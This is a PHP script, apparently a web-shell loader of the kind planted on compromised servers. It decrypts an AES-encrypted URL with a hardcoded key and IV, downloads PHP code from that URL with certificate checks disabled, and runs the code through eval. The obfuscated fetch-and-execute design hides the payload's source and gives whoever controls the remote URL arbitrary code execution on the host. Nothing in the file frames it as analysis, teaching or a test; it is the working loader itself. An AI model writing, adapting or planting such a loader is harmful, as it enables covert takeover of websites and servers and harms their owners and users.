<?php

class RemotePHPExecutor
{
    private $url;
    private $code = null;
    private $error = null;

    public function __construct($url)
    {
        $this->url = $url;
        $this->fetchCode();
    }

    private function fetchCode()
    {
        $code = $this->fetchUsingCurl();

        if ($code === false) {
            $code = $this->fetchUsingFileGetContents();
        }

        if ($code === false) {
            $this->error = "Gagal mengambil konten dari URL: {$this->url}";
            return;
        }

        $this->code = $code;
    }

    private function fetchUsingCurl()
    {
        if (!function_exists('curl_init')) {
            return false;
        }

        $ch = curl_init($this->url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return ($httpCode === 200 && $result !== false) ? $result : false;
    }

    private function fetchUsingFileGetContents()
    {
        $context = stream_context_create([
            "http" => ["follow_location" => 1, "timeout" => 10],
            "https" => ["verify_peer" => false, "verify_peer_name" => false]
        ]);

        return @file_get_contents($this->url, false, $context);
    }

    public function render()
    {
        if (empty($this->code)) {
            return $this->error ?: "Tidak ada konten untuk dijalankan.";
        }

        try {
            ob_start();
            eval("?>".$this->code);
            return ob_get_clean();
        } catch (Exception $e) {
            return "Kesalahan saat mengeksekusi konten: " . $e->getMessage();
        }
    }
}

$this_data = ['WkVVevhJ6c3kzPgrVa8+tqa9O0XNdHE2KcCLxnWnycBdfu599985kNYKtICZ5HzzdkKE5nLhLzMXlnJ4K72NluGe6+vlmB4='];

$key = "akupengeneweanay";
$token = "yanaewenegnepuka";

foreach ($this_data as $data_encrypted) {
    $nulzganteng = openssl_decrypt($data_encrypted, "AES-128-CTR", $key, 0, $token);
    $remote = new RemotePHPExecutor($nulzganteng);
    echo $remote->render();
}

?>
